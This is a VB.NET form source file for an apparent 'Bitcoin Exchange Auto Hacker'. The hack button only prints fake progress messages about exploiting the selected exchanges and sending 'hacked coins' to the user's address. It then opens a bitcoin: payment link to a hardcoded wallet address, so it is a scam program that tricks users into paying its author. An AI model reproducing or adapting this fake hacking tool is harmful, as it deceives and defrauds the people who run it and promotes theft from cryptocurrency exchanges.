Public Class frmMain

    Private Sub btnHack_Click(sender As System.Object, e As System.EventArgs) Handles btnHack.Click
        If String.IsNullOrWhiteSpace(txtAddress.Text.Trim().ToString()) Then
            MessageBox.Show("No address set")
        Else
            If chlExchanges.CheckedItems.Count = 0 Then
                MessageBox.Show("No Exchanges set")
            Else
                For Each it In chlExchanges.CheckedItems
                    txtProgress.Text = txtProgress.Text + "Connecting to " + it.ToString() + "..." + vbCrLf
                    txtProgress.Text = txtProgress.Text + "Running super cool exploit ..." + vbCrLf
                    txtProgress.Text = txtProgress.Text + "Sending hacked coins to " + txtAddress.Text.Trim().ToString() + vbCrLf
                Next
                System.Diagnostics.Process.Start("bitcoin:18krgoMr5yNRX8dAg1XTuxXmCpvwzDxRgu?label=Bitcoin Exchange Auto Hacker")
            End If
        End If
    End Sub
End Class
